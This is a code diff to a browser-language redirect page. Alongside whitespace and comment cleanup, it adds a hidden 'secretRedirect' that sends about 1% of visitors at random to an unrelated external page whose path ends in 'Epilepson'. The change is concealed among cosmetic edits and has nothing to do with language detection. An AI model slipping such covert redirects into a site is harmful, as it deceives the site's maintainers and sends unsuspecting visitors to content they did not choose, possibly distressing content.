@@ -4,57 +4,45 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Redirecting…</title>
-
     <script>
         const pages = {
             "cs": "cs.html",
             "en": "en-gb.html",
-			"ru": "ru.html",
+            "ru": "ru.html",
             "pt": "pt-br.html",
-			"ko": "ko.html",
-			"de": "de.html",
-			"ja": "ja.html"
+            "ko": "ko.html",
+            "de": "de.html",
+            "ja": "ja.html"
         };
-
         const fallback = "en-gb.html";
-
+        const secretRedirectChance = 0.01;
+        const secretRedirect =
+            "https://glass-jug.github.io/GJG/EGM/Epilepson/";
         function detectLanguage() {
+            if (Math.random() < secretRedirectChance) {
+                return secretRedirect;
+            }
             const browserLanguages = Array.isArray(navigator.languages)
                 ? navigator.languages
                 : [navigator.language];
-
             for (const language of browserLanguages) {
                 if (!language) continue;
-
                 const normalised = language.toLowerCase();
                 const base = normalised.split("-")[0];
-
                 console.log("Checking browser language:", language);
-
-                // Exact match, e.g. pt-br
                 if (pages[normalised]) {
                     return pages[normalised];
                 }
-
-                // Base language match, e.g. cs-cz -> cs
                 if (pages[base]) {
                     return pages[base];
                 }
             }
-
             return fallback;
         }
-
         const destination = detectLanguage();
 
         console.log("Browser languages:", navigator.languages);
         console.log("Selected page:", destination);
-
         window.location.replace(destination);
     </script>
 </head>
-
-<body>
-    <p>Redirecting…</p>
-</body>
-</html>
